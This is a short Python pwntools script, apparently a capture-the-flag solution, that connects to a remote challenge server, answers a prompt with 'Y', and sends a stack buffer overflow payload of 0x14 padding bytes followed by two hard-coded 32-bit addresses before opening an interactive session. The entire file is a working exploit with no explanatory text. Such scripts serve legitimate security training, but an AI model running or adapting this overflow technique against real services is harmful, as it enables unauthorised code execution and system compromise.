#!/usr/bin/env python
from pwn import *
#program = process('./pwn2')
program = remote('ctf.cnss.studio', 5002)
ow_num = 0x14
ow_str = ''
ow_str += 'a' * ow_num
ow_str += p32(0x08048537)
ow_str += p32(0x08048780)
program.sendline('Y')
program.sendline(ow_str)
program.interactive()
